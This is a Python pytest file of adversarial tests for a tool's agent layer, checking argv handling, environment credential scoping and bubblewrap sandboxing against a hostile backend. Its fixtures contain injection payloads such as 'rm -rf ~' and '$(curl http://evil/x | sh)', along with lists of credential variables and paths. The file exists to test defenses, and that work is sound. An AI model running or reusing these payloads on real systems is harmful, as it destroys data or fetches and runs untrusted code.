"""Adversarial security tests for the pluggable-agent layer.

Each test is tagged to a finding in docs/threat-model.md and asserts that
gitbulk's deterministic code cages a hostile or misconfigured backend. The
"malicious agent" is a controlled fixture; containment lives in the argv
builder, the env scoper, and config validation — so these are hermetic (no
network, no real subprocess) per AGENTS.md.

See docs/pluggable-agents.md §11 for the full threat→control→test matrix.
Phase 4 adds the sandbox/verify-before-push tests; this file covers Phase 2
(template + env) controls.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from gitbulk.agent import AgentConfigError, CommandAgentBackend, parse_agent_profile
from gitbulk.config.policy import load_policy


def _backend(command, **kw):
    from gitbulk.agent import AgentProfile

    return CommandAgentBackend(
        AgentProfile(name="evil", command=tuple(command), **kw)
    )


# ─── TM §5 / agtmpl9k — command injection via prompt content ────────────────
# A prompt carrying shell metacharacters / newlines / option-like text must
# land as exactly ONE argv element. There is no shell, so it cannot break out.


@pytest.mark.parametrize(
    "evil_prompt",
    [
        "; rm -rf ~ #",
        "$(curl http://evil/x | sh)",
        "`reboot`",
        "a\nb\nc",
        "--dangerously-do-something",
        "x && git push origin main",
    ],
)
def test_prompt_metacharacters_stay_one_argv_token(monkeypatch, evil_prompt):
    import shutil

    monkeypatch.setattr(shutil, "which", lambda name: f"/canonical/{name}")
    inv = _backend(["tool", "-p", "{prompt}"]).plan(evil_prompt)
    # The prompt occupies exactly one element, verbatim — no splitting,
    # no extra args injected, no shell to interpret it.
    assert inv.argv.count(evil_prompt) == 1
    assert inv.argv == ["/canonical/tool", "-p", evil_prompt]


def test_model_value_cannot_inject_extra_args(monkeypatch):
    import shutil

    monkeypatch.setattr(shutil, "which", lambda name: f"/canonical/{name}")
    inv = _backend(
        ["tool", "-p", "{prompt}"], model_args=("-m", "{model}"), model="x"
    ).plan("p", model="evil --inject")
    assert inv.argv[-1] == "evil --inject"  # one token, not two args


# ─── agtmpl9k — a scalar command string is refused (no shell foot-gun) ───────


def test_scalar_command_string_is_rejected():
    with pytest.raises(AgentConfigError, match="not a single string"):
        parse_agent_profile("evil", {"command": "tool -p {prompt}"}, "w")


def test_scalar_env_string_is_rejected():
    with pytest.raises(AgentConfigError, match="list"):
        parse_agent_profile(
            "evil", {"command": ["t", "{prompt}"], "env": "GH_TOKEN"}, "w"
        )


# ─── T6 / agtmpl9k — binary is pinned; PATH prepend cannot substitute it ────


def test_binary_pinned_via_which(monkeypatch):
    import shutil

    monkeypatch.setattr(shutil, "which", lambda name: "/usr/bin/realtool")
    b = _backend(["realtool", "-p", "{prompt}"])
    assert b.plan("p").argv[0] == "/usr/bin/realtool"


def test_relative_command_path_that_is_missing_is_rejected(monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)
    with pytest.raises(AgentConfigError):
        _backend(["./inject", "-p", "{prompt}"])


# ─── T1 / agenv6q — env allowlist withholds inherited credentials ───────────


def test_scoped_env_excludes_ambient_secrets(monkeypatch):
    import shutil

    monkeypatch.setattr(shutil, "which", lambda name: f"/canonical/{name}")
    for var in ("GH_TOKEN", "AWS_SECRET_ACCESS_KEY", "SSH_AUTH_SOCK", "NPM_TOKEN"):
        monkeypatch.setenv(var, "leak")
    monkeypatch.setenv("PATH", "/usr/bin")
    monkeypatch.setenv("GEMINI_API_KEY", "needed")

    inv = _backend(
        ["gemini", "-p", "{prompt}"], env=("GEMINI_API_KEY",)
    ).plan("p")
    assert inv.env is not None
    # Only the named key + safe base survive; no ambient credential leaks.
    assert inv.env["GEMINI_API_KEY"] == "needed"
    assert inv.env["PATH"] == "/usr/bin"
    for secret in ("GH_TOKEN", "AWS_SECRET_ACCESS_KEY", "SSH_AUTH_SOCK", "NPM_TOKEN"):
        assert secret not in inv.env


def test_default_env_inherits_for_backcompat(monkeypatch):
    import shutil

    monkeypatch.setattr(shutil, "which", lambda name: f"/canonical/{name}")
    monkeypatch.setenv("GH_TOKEN", "present")
    # No env allowlist → inherit (env is None → child gets parent environment).
    assert _backend(["t", "-p", "{prompt}"]).plan("p").env is None


# ─── config loads end-to-end through policy (agents: block) ──────────────────


def test_agents_block_parsed_by_load_policy(tmp_path):
    cfg = tmp_path / "gitbulk.yaml"
    cfg.write_text(
        "default_agent: gemini\n"
        "agents:\n"
        "  gemini:\n"
        "    model: gemini-flash\n"
        "  mine:\n"
        "    command: [mine, run, '{prompt}']\n"
        "    prompt_via: arg\n"
    )
    pol = load_policy(cfg)
    assert pol.default_agent == "gemini"
    assert pol.agents["gemini"].model == "gemini-flash"
    assert pol.agents["mine"].command == ("mine", "run", "{prompt}")


def test_bad_agents_block_rejected_by_load_policy(tmp_path):
    cfg = tmp_path / "gitbulk.yaml"
    cfg.write_text("agents:\n  evil:\n    command: 'tool -p {prompt}'\n")
    with pytest.raises(Exception, match="not a single string"):
        load_policy(cfg)


# ─── T1 / agsbx3k — bwrap sandbox isolates a hostile agent ──────────────────


def _sandboxed_plan(monkeypatch, policy, tmp_path):
    import shutil

    monkeypatch.setattr(shutil, "which", lambda name: f"/canonical/{name}")
    monkeypatch.setattr("gitbulk.agent.bwrap_available", lambda: True)
    # Let the REAL wrap_argv run, but make every system dir "exist" and bwrap
    # resolvable, so we assert the real composed argv.
    monkeypatch.setattr("gitbulk.sandbox.shutil.which", lambda n: "/usr/bin/bwrap")
    monkeypatch.setattr("gitbulk.sandbox.Path.exists", lambda self: True)
    from gitbulk.agent import AgentProfile, CommandAgentBackend

    b = CommandAgentBackend(AgentProfile(name="evil", **policy))
    return b.plan("p", working_directory=tmp_path)


def test_fs_no_net_sandbox_cuts_network_and_hides_creds(monkeypatch, tmp_path):
    inv = _sandboxed_plan(
        monkeypatch,
        {"command": ("evil", "-p", "{prompt}"), "sandbox": "fs+no-net"},
        tmp_path,
    )
    argv = inv.argv
    assert argv[0] == "/usr/bin/bwrap"
    assert "--unshare-net" in argv  # no network egress
    home = str(Path.home())
    # No credential location is bound into the sandbox.
    for secret in (f"{home}/.ssh", f"{home}/.aws", f"{home}/.config/gh"):
        assert secret not in argv
    # The worktree IS available (the one writable path).
    assert str(tmp_path) in argv


def test_sandbox_refuses_when_host_cannot_provide_it(monkeypatch, tmp_path):
    """refuse-if-unavailable: gitbulk does NOT silently run unsandboxed."""
    import shutil

    monkeypatch.setattr(shutil, "which", lambda name: f"/canonical/{name}")
    monkeypatch.setattr("gitbulk.agent.bwrap_available", lambda: False)
    from gitbulk.agent import AgentProfile, CommandAgentBackend

    with pytest.raises(AgentConfigError, match="bubblewrap is unavailable"):
        CommandAgentBackend(
            AgentProfile(name="x", command=("x", "{prompt}"), sandbox="fs-only")
        )
